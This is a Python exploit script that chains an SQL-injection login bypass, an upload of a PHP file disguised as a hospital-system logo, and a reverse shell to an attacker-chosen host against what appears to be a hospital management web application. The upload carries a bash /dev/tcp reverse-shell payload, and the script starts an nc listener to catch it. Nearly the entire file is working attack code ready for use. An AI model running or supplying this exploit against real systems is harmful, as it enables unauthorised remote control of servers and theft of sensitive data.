#!/usr/bin/python3

import time
import requests
import sys
import subprocess
import string
import random

proxies = {"http":"http://127.0.0.1:8080"}

def authbypass(targetip, port):
    target = "http://%s:%s/login.php" % (targetip, port)

    d = {
        "user":"admin",
        "email":"'=''or'",
        "password" :"'=''or'",
        "btn_login" : ""
    }
    
    headers = {
         "Content-Type": "application/x-www-form-urlencoded"
    }

    s = requests.Session()
    #r = s.post(target, data=d, proxies=proxies)
    r = s.post(target, data=d)
    res = r.text
    if "Login Successfully" in res:
         print("(+) Login was successful")
         return s
    else:
         print("(-) Login was not successful")

def fileupload(targetip, filename, session, port, lhost, lport):
    target = "http://%s:%s/manage_website.php" % (targetip, port)
    payload = """<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'");?>""" %(lhost, lport)
    #payload = """<?php echo shell_exec($_GET["cmd"]); ?>"""
    #r = session.get(target, proxies=proxies, allow_redirects=True)
    r = session.get(target, allow_redirects=True)
    f = {   
        'title': (None,"logo for hospital system.jpg"), #The none there is to prevent the filename from appearing
        'short_title': (None,""),
        'footer': (None,""), 
        'currency_code': (None,""), 
        'currency_symbol': (None,""), 
        'old_website_image': (None,""),
        'website_image': (filename , payload, "application/x-php"), 
        'old_invoice_image': (None,""),
        'invoice_image': ("", "", "application/octet-stream"),
        'old_login_image': (None,""),
        'login_image': ("", "", "application/octet-stream"),
        'old_back_login_image': (None,""),
        'back_login_image': ("", "", "application/octet-stream"),
        'btn_web': (None,"")
    }
    #r = session.post(target, files=f, proxies=proxies, allow_redirects=True)
    r = session.post(target, files=f, allow_redirects=True)
    res = r.text
    if "Something Went Wrong" in res:
        print("(+) Uploaded malicious file successfully")
        return session
    else:
        print("(-) Malicious file not uploaded successfully")
        
def fileupload_revShell(targetip, port, filename, session, lport):
    target = "http://%s:%s/uploadImage/Logo/%s" % (targetip, port, filename)
    print("[*] Starting reverse shell...")
    subprocess.Popen(["nc","-nvlp","%s" % lport])
    time.sleep(1)
    #r = requests.get(target, proxies=proxies, allow_redirects=True)
    r = requests.get(target, allow_redirects=True)
    
    print(("(+) Check Rev Shell, file upload success"))

def main():
    targetip = sys.argv[1]
    port = sys.argv[2]
    lhost = sys.argv[3]
    lport = sys.argv[4]
    filename = sys.argv[5]
    session = authbypass(targetip, port)
    session = fileupload(targetip, filename, session, port, lhost, lport)
    fileupload_revShell(targetip, port, filename, session, lport)

if __name__ == "__main__":
    main()